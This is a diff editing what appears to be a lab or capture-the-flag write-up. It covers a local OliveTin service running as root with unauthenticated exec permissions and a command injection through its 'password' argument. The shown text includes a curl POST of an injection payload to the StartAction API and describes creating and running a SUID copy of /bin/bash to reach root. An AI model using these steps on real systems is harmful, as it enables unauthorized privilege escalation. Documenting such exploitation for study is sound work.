@@ -290,7 +290,6 @@ Port `1337` was listening only on localhost.
 ```bash
 curl 127.0.0.1:1337
 ```
-
 The response identified the service as OliveTin.
 
 The installed version was checked:
@@ -321,6 +320,16 @@ root        1523  0.0  0.4 1240144 16764 ?       Ssl  22:30   0:00 /usr/local/bi
 This was immediately interesting because the web service was running with root privileges.
 
 ## 8. OliveTin Configuration Analysis
+
+```text
+OliveTin is a lightweight tool that allows predefined shell commands to be executed from a web interface.
+Commands are defined in config.yaml.
+For example:
+- title: Check disk space
+  shell: df -h /media
+This allows the user to run df -h /media by clicking a button.
+OliveTin also provides an API for executing these actions.
+```
 
 The OliveTin configuration file was located at:
 
@@ -366,17 +375,18 @@ This setting means authentication was not required for accessing OliveTin as a g
 Combined with:
 
 defaultPermissions:
+
+```bash
   view: true
   exec: true
   logs: true
+```
 
 the configured actions were executable without requiring a normal user login.
 
 This was an important condition for exploitation because the vulnerable Backup Database action could be reached without first obtaining a valid OliveTin account.
 
 ## 9. OliveTin Command Injection
-
-OliveTin version `3000.10.0` was identified as vulnerable to CVE-2026-27626.
 
 The vulnerable `password` argument handling allowed shell metacharacters to bypass validation and reach the command execution layer.
 
@@ -400,19 +410,14 @@ cat > /tmp/payload.json << 'EOF'
 }
 EOF
 ```
-
-sent it to api
+then send it to api 
 ```bash
 curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
   -H "Content-Type: application/json" \
   --data @/tmp/payload.json
 ```
 
-The injected command created a SUID copy of `/bin/bash`:
-
-```text
-/tmp/aa
-```
+The injected command created a SUID copy of /bin/bash
 
 The binary was then executed:
 
